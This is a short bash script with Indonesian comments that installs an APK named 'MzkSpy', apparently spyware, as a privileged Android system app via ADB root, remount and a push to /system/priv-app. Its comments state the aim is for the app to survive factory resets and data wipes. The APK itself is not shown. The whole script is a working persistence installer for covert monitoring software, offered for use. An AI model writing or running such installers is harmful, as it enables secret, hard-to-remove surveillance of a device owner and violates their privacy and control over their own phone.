#!/usr/bin/env bash
# Pasang agent sebagai app sistem. Butuh root + ADB/magisk.
# Hanya ini yang bisa bertahan setelah setelan pabrik.
set -euo pipefail
R='\033[1;31m'; G='\033[1;32m'; N='\033[0m'
cd "$(dirname "$0")/.."

APK="${1:-agent/prebuilt/agent.apk}"
[[ -f "$APK" ]] || { echo -e "${R}APK tidak ada: $APK${N}"; exit 1; }
command -v adb >/dev/null || { echo -e "${R}adb tidak ada${N}"; exit 1; }

echo -e "${G}[1/4]${N} remount /system"
adb root || true
adb remount || true

echo -e "${G}[2/4]${N} push ke /system/priv-app"
adb push "$APK" /system/priv-app/MzkSpy/MzkSpy.apk

echo -e "${G}[3/4]${N} permission"
adb shell chmod 644 /system/priv-app/MzkSpy/MzkSpy.apk

echo -e "${G}[4/4]${N} reboot"
adb reboot

echo -e "${G}Selesai.${N} Setelah reboot, app jadi sistem dan tahan wipe data."
